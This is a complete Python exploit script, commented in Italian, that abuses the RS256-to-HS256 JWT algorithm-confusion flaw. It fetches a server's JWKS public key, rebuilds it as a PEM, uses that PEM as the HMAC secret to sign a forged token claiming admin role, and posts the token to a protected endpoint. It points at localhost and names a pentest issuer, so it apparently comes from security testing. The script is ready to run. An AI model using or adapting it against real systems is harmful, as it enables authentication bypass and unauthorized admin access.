#!/usr/bin/env python3
"""
Forge JWT admin – firma HS256 usando la chiave pubblica del server
(vulnerabilità “RS256 ➜ HS256 alg confusion”).

Requisiti:
    pip install cryptography requests
"""

import requests
import json
import base64
import hmac
import hashlib
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

TARGET   = "http://localhost:8000"
JWKS_URI = f"{TARGET}/.well-known/jwks.json"
ADMIN_EP = f"{TARGET}/api/user"


def b64url_encode(data: bytes) -> str:
    """Base64 URL-safe senza padding = ( = ) finali."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def main() -> None:
    # -----------------------------------------------------------------
    # 1) Scarica la JWKS e preleva n (modulus) ed e (exponent)
    # -----------------------------------------------------------------
    jwk = requests.get(JWKS_URI, timeout=5).json()["keys"][0]
    n   = jwk["n"]
    e   = jwk["e"]

    # -----------------------------------------------------------------
    # 2) Converte JWK → chiave pubblica PEM identica a pub.pem
    # -----------------------------------------------------------------
    modulus_int  = int.from_bytes(base64.urlsafe_b64decode(n + "=="), "big")
    exponent_int = int.from_bytes(base64.urlsafe_b64decode(e + "=="), "big")

    pub_numbers  = rsa.RSAPublicNumbers(exponent_int, modulus_int)
    pub_key_obj  = pub_numbers.public_key()

    PEM = pub_key_obj.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()  # contiene \n finale

    # -----------------------------------------------------------------
    # 3) Costruisci header e payload (formattazione compatibile jsonwebtoken)
    # -----------------------------------------------------------------
    header = {
        "alg": "HS256",
        "typ": "JWT",
        "kid": jwk["kid"]
    }

    payload = {
        "_id": "000000000000000000000001",   # ID arbitrario da usare in loggedInUserId
        "role": 1,                           # admin
        "iat": 1710000000,
        "exp": 1893456000,
        "iss": "pentest.local"
    }

    signing_input = (
        f"{b64url_encode(json.dumps(header,  separators=(',', ':')).encode())}."
        f"{b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"
    )

    # -----------------------------------------------------------------
    # 4) Firma HS256 usando il PEM come segreto simmetrico
    # -----------------------------------------------------------------
    signature = hmac.new(
        PEM.encode(), signing_input.encode(), hashlib.sha256
    ).digest()

    token = f"{signing_input}.{b64url_encode(signature)}"

    print("\n[+] Token HS256 forgiato:\n", token, "\n")

    # -----------------------------------------------------------------
    # 5) Richiesta all’endpoint protetto
    # -----------------------------------------------------------------
    resp = requests.post(
        ADMIN_EP,
        headers={"token": token, "Content-Type": "application/json"},
        json={"loggedInUserId": payload["_id"]}
    )

    print("[+] Status :", resp.status_code)
    print("[+] Response:", resp.text)


if __name__ == "__main__":
    main()
